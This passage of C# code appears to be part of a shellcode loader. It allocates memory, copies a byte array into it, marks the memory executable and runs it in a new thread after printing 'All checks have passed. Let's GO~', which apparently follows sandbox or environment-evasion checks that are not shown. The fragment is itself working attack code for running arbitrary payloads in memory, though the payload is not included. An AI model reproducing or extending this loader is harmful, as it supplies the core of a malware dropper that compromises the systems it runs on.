				UInt32 funcAddr = VirtualAlloc(0, (UInt32)mydata.Length,
					MEM_COMMIT, PAGE_READWRITE);
				Marshal.Copy(mydata, 0, (IntPtr)(funcAddr), mydata.Length);
				uint oldprotection;
				VirtualProtect((IntPtr)(funcAddr), mydata.Length, PAGE_EXECUTE, out oldprotection);
				IntPtr hThread = IntPtr.Zero;
				UInt32 threadId = 0;
				IntPtr pinfo = IntPtr.Zero;
				Console.Write("All checks have passed. Let's GO~");
				hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
				WaitForSingleObject(hThread, 0xFFFFFFFF);